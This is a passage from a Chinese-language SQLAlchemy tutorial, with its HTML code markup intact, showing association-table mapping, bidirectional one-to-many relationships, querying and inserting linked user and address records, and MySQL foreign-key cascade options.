string">'2010-12-1'</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'2010-12-1'</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'2010-12-1'</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'2010-12-1'</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>使用<code>SQLAlchemy</code></p><p>如果中间表有意义,可以不指定<code>secondary</code> 参数,而是创建新类直接映射表.它类似与这样:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10227.png" alt="10227"></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> create_engine<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> sessionmaker<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>ext<span class="token punctuation">.</span>declarative <span class="token keyword">import</span> declarative_base<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> Column<span class="token punctuation">,</span> Integer<span class="token punctuation">,</span> String<span class="token punctuation">,</span> Date<span class="token punctuation">,</span> DateTime<span class="token punctuation">,</span> Time<span class="token punctuation">,</span> Text<span class="token punctuation">,</span> Enum<span class="token punctuation">,</span> DECIMAL<span class="token punctuation">,</span> ForeignKey<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span>  relationship<span class="token comment" spellcheck="true"># 1.连接数据库</span>engine <span class="token operator">=</span> create_engine<span class="token punctuation">(</span><span class="token string">'mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/sqlalchemy'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.创建Session</span>Session <span class="token operator">=</span> sessionmaker<span class="token punctuation">(</span>bind<span class="token operator">=</span>engine<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3.实例化session</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 4.创建Model</span><span class="token comment" spellcheck="true"># 创建基类</span>Base <span class="token operator">=</span> declarative_base<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建映射</span><span class="token keyword">class</span> <span class="token class-name">Course_Student_2</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'course_student_2'</span>    e_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    c_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'course_2.c_id'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    s_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'student2.s_id'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    e_time <span class="token operator">=</span> Column<span class="token punctuation">(</span>Date<span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    e_score <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    e_course <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Course_2'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'student'</span><span class="token punctuation">)</span>    e_student <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Student_2'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'course'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Course_2</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'course_2'</span>    c_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>    c_name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 创建 双向关系</span>    <span class="token comment" spellcheck="true"># 字段第一个 指向 子类</span>    <span class="token comment" spellcheck="true"># 第二个指向 Table  实例</span>    <span class="token comment" spellcheck="true"># 第三个 双向 参数,必须保证子类中有这个属性</span>    student <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Course_Student_2'</span><span class="token punctuation">,</span>  back_populates<span class="token operator">=</span><span class="token string">'e_course'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Student_2</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'student_2'</span>    s_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    s_name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 创建双向关系</span>    <span class="token comment" spellcheck="true"># 第一个指向父类</span>    <span class="token comment" spellcheck="true"># 第二个指向 Table 实例</span>    <span class="token comment" spellcheck="true"># 第三个 双向参数 必须保证父类中有这个属性</span>    course <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Course_Student_2'</span><span class="token punctuation">,</span>  back_populates<span class="token operator">=</span><span class="token string">'e_student'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 映射完成后,查询验证</span>q1 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>Course_2<span class="token punctuation">.</span>c_name<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>Course_2<span class="token punctuation">.</span>c_id<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="12-双向关系中数据的查询和添加"><a href="#12-双向关系中数据的查询和添加" class="headerlink" title="12.双向关系中数据的查询和添加"></a>12.双向关系中数据的查询和添加</h3><blockquote><p>这里演示多表查询基于一对多关系.</p><p>多对多关系也是基于一对多关系的.</p><p>有如下一对多关系:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10228.png" alt="10228"></p><hr><p>使用<code>MySQL</code>创建表</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">use</span> sqlalchemy<span class="token punctuation">;</span><span class="token keyword">create</span> <span class="token keyword">table</span> user_1<span class="token punctuation">(</span>    id <span class="token keyword">int</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>    name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    fullname <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    nickname <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">primary</span> <span class="token keyword">key</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">engine</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">default</span> <span class="token keyword">charset</span> utf8 <span class="token keyword">comment</span> <span class="token string">"用户表"</span><span class="token punctuation">;</span><span class="token keyword">create</span> <span class="token keyword">table</span> addresses_1<span class="token punctuation">(</span>    id <span class="token keyword">int</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>    email_address <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    user_id <span class="token keyword">int</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>    <span class="token keyword">primary</span> <span class="token keyword">key</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">constraint</span> p1 <span class="token keyword">foreign</span> <span class="token keyword">key</span> <span class="token punctuation">(</span>user_id<span class="token punctuation">)</span> <span class="token keyword">references</span> user_1<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">engine</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">default</span> <span class="token keyword">charset</span> utf8 <span class="token keyword">comment</span> <span class="token string">"地址表"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>创建<code>SQLAlchemy</code>连接</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> create_engine<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> sessionmaker<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>ext<span class="token punctuation">.</span>declarative <span class="token keyword">import</span> declarative_base<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> Column<span class="token punctuation">,</span> Integer<span class="token punctuation">,</span> String<span class="token punctuation">,</span> Date<span class="token punctuation">,</span> DateTime<span class="token punctuation">,</span> Time<span class="token punctuation">,</span> Text<span class="token punctuation">,</span> Enum<span class="token punctuation">,</span> DECIMAL<span class="token punctuation">,</span> ForeignKey<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span>  relationship<span class="token comment" spellcheck="true"># 1.连接数据库</span>engine <span class="token operator">=</span> create_engine<span class="token punctuation">(</span><span class="token string">'mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/sqlalchemy'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.创建Session</span>Session <span class="token operator">=</span> sessionmaker<span class="token punctuation">(</span>bind<span class="token operator">=</span>engine<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3.实例化session</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 4.创建Model</span><span class="token comment" spellcheck="true"># 创建基类</span>Base <span class="token operator">=</span> declarative_base<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建映射</span><span class="token keyword">class</span> <span class="token class-name">User1</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'user_1'</span>    id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    fullname <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    nickname <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 定义双向对应,连接的是 Model</span>    address <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Address1'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Address1</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'addresses_1'</span>    id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    email_address <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 定义外键</span>    user_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'user_1.id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 定义双向对应</span>    user <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'User1'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'address'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>初始化一个<code>User1</code> 的实例,并访问它的<code>address</code> 属性,它是一个类<code>list</code> 对象.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 创建一个User1实例对象</span><span class="token operator">>></span><span class="token operator">></span> Jack<span class="token operator">=</span>User1<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'Jack'</span><span class="token punctuation">,</span> fullname<span class="token operator">=</span><span class="token string">"Jack Ning"</span><span class="token punctuation">,</span> nickname<span class="token operator">=</span><span class="token string">'Ningning'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> Jack<span class="token punctuation">.</span>address<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> type<span class="token punctuation">(</span>Jack<span class="token punctuation">.</span>address<span class="token punctuation">)</span>sqlalchemy<span class="token punctuation">.</span>orm<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>InstrumentedList<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为我们上面使用的是双向的一对多关系,那么在一个方向上添加元素,会自动的在另一个方向上可见.需要注意的是,这只是在<code>python</code> 中做操作,并没有与数据库进行交互.而且,<code>address</code> 就指向了<code>Address1</code> 的实例化对象,所有可以这样创建这个对象</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> Jack<span class="token punctuation">.</span>address <span class="token operator">=</span> <span class="token punctuation">[</span>Address1<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> email_address<span class="token operator">=</span><span class="token string">'xxx@xx1.com'</span><span class="token punctuation">,</span> user_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>Address1<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> email_address<span class="token operator">=</span><span class="token string">'xxx@xx2.com'</span><span class="token punctuation">,</span> user_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>Address1<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> email_address<span class="token operator">=</span><span class="token string">'xxx@xx3.com'</span><span class="token punctuation">,</span> user_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 可以使用 list 的方法 比如,append,count,extend,等等</span><span class="token comment" spellcheck="true"># 访问数据对象</span><span class="token operator">>></span><span class="token operator">></span>Jack<span class="token punctuation">.</span>address<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>__main__<span class="token punctuation">.</span>Address1 at <span class="token number">0x7fd4c81476d0</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里并没有手动的去实例化<code>Address1</code> 的对象,但是在内存中确实创建了它的实例对象,如果这时提交到数据库中,那么会把所有的实例对象都提交.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>Jack<span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看日志:</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># tail -5 /mysql_data/localhost.log</span>Query    SET NAMES utf8mb4Query    INSERT INTO user_1 <span class="token punctuation">(</span>id, name, fullname, nickname<span class="token punctuation">)</span> VALUES <span class="token punctuation">(</span>1, <span class="token string">'Jack'</span>, <span class="token string">'Jack Ning'</span>, <span class="token string">'Ningning'</span><span class="token punctuation">)</span>Query    INSERT INTO addresses_1 <span class="token punctuation">(</span>id, email_address, user_id<span class="token punctuation">)</span> VALUES <span class="token punctuation">(</span>1, <span class="token string">'xxx@xx1.com'</span>, 1<span class="token punctuation">)</span>,<span class="token punctuation">(</span>2, <span class="token string">'xxx@xx2.com'</span>, 1<span class="token punctuation">)</span>,<span class="token punctuation">(</span>3, <span class="token string">'xxx@xx3.com'</span>, 1<span class="token punctuation">)</span>Query    COMMITQuery    ROLLBACK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到把所有的实例对象都提交到了数据库中.</p><p>一对多关系中,各自返回的数据类型也不相同</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 查询表中所有的行</span>q1 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q1<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""SELECT user_1.id AS user_1_id, user_1.name AS user_1_name, user_1.fullname AS user_1_fullname, user_1.nickname AS user_1_nickname FROM user_1"""</span><span class="token comment" spellcheck="true"># 查询表中第一行</span>q2 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User1<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q2<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""&lt;__main__.User1 object at 0x7fa624b6c150>"""</span><span class="token comment" spellcheck="true"># 返回的类的一个实例,而类的实例的 address 属性是个list 对象</span><span class="token triple-quoted-string string">"""因为在 User1 中定义了 属性 address, 它对应的就是 外键连接的所有 Addresses1中的所有列相当于执行了SELECT addresses_1.id AS addresses_1_id, addresses_1.email_address AS addresses_1_email_address, addresses_1.user_id AS addresses_1_user_id FROM addresses_1 WHERE 1 = addresses_1.user_id"""</span>q2<span class="token punctuation">.</span>address<span class="token triple-quoted-string string">"""[&lt;__main__.Address1 at 0x7fa62616d290>,&lt;__main__.Address1 at 0x7fa62616d310>,&lt;__main__.Address1 at 0x7fa62616d390>]"""</span>type<span class="token punctuation">(</span>q2<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># sqlalchemy.orm.collections.InstrumentedList</span><span class="token keyword">for</span> i <span class="token keyword">in</span> q2<span class="token punctuation">.</span>address<span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>id<span class="token punctuation">,</span> i<span class="token punctuation">.</span>user_id<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""1 12 13 1"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>双向查询</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 因为是双向的,所以也可以去 Address1的查询实例</span><span class="token triple-quoted-string string">"""SELECT addresses_1.id AS addresses_1_id, addresses_1.email_address AS addresses_1_email_address, addresses_1.user_id AS addresses_1_user_id FROM addresses_1 LIMIT 1"""</span>q3 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>Address1<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q3<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># &lt;__main__.User1 object at 0x7fa625af7c10></span>q3<span class="token punctuation">.</span>user<span class="token punctuation">.</span>id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>双向添加数据</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 由于在关系 一  的一行返回的是一个 list对象,而在关系 多 的一行返回的是 类的实例</span><span class="token comment" spellcheck="true"># 这样添加数据可以是</span>user <span class="token operator">=</span> User1<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Bob'</span><span class="token punctuation">,</span> fullname<span class="token operator">=</span><span class="token string">'Bob Ning'</span><span class="token punctuation">,</span> nickname<span class="token operator">=</span><span class="token string">'Bob NN'</span><span class="token punctuation">)</span>add1 <span class="token operator">=</span> Address1<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>email_address<span class="token operator">=</span><span class="token string">'xxx@xx4.com'</span><span class="token punctuation">,</span>user_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>add2 <span class="token operator">=</span> Address1<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>email_address<span class="token operator">=</span><span class="token string">'xxx@xx5.com'</span><span class="token punctuation">,</span>user_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># list 对象</span>user<span class="token punctuation">.</span>address<span class="token punctuation">.</span>append<span class="token punctuation">(</span>add1<span class="token punctuation">)</span>user<span class="token punctuation">.</span>address<span class="token punctuation">.</span>append<span class="token punctuation">(</span>add2<span class="token punctuation">)</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>user<span class="token punctuation">)</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 而对于 Address1 的实例可以这样添加</span>session1 <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span>user2 <span class="token operator">=</span> User1<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Harry'</span><span class="token punctuation">,</span> fullname<span class="token operator">=</span><span class="token string">'Harry K'</span><span class="token punctuation">,</span> nickname<span class="token operator">=</span><span class="token string">'K K'</span><span class="token punctuation">)</span>add3 <span class="token operator">=</span> Address1<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span>email_address<span class="token operator">=</span><span class="token string">'xxx@xx6.com'</span><span class="token punctuation">,</span>user_id<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>add4 <span class="token operator">=</span> Address1<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">,</span>email_address<span class="token operator">=</span><span class="token string">'xxx@xx7.com'</span><span class="token punctuation">,</span>user_id<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>add3<span class="token punctuation">.</span>user <span class="token operator">=</span> user2add4<span class="token punctuation">.</span>user <span class="token operator">=</span> user2session1<span class="token punctuation">.</span>add<span class="token punctuation">(</span>add3<span class="token punctuation">)</span>session1<span class="token punctuation">.</span>add<span class="token punctuation">(</span>add4<span class="token punctuation">)</span>session1<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>session1<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以通过查看<code>mysql</code> 数据库查看数据正常添加.</p></blockquote><h3 id="13-cascade级联"><a href="#13-cascade级联" class="headerlink" title="13.cascade级联"></a>13.<code>cascade</code>级联</h3><blockquote><p>首先,对于原生的<code>SQL</code>语句,已经<code>MySQL</code>而言,外键约束如下:</p><pre class="line-numbers language-mysql"><code class="language-mysql">create table table_name(    column_1,    column_2,    ....    constraint constraint_name foreign key (column_name)     references parent_table(column_name)    on delete action    on update action) engine=InnoDB default charset utf8;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>constraint</code> 子句允许为外键定义一个名称,如果不写,<code>MySQL</code> 自动生成一个名称</p></li><li><p><code>foreign key</code> 子句指定子表中要应用父表的列.注意:<code>MySQL</code> 会自动创建一个基于外键的索引.</p></li><li><p><code>references</code> 子句指定父表中的被引用字段.<code>foreign key</code> 和<code>references</code> 指定的列数必须相同.</p></li><li><p><code>on delete</code>: 定义当父表中的记录被删除时,子表的记录应该执行的动作.<code>action</code>包括:</p><ul><li><code>on delete restrict</code>:(默认),父表不能删除一个已经被子表引用的记录.</li><li><code>on delete no action</code>:等同与<code>on delete restrict</code></li><li><code>on delete cascade</code>: 级联模式,父表删除后,对应子表关联的数据也跟着被删除</li><li><code>on delete set null</code>:置空模式,父表删除后,对应子表关联的外键值被设置为<code>NULL</code>,需要注意的是,如果子表的外键设置<code>not null</code> ,则不能使用这种模式,因为会相互冲突.</li></ul></li><li><p><code>on update</code>:定义父表中的记录更新时,子表的记录应该执行的动作.<code>action</code> 包括:</p><ul><li><code>on update restrict</code>:(默认),父表不能更新一个已经被子表引用的记录.</li><li><code>on update no action</code>:等同与<code>on delete restrict</code></li><li><code>on update cascade</code>: 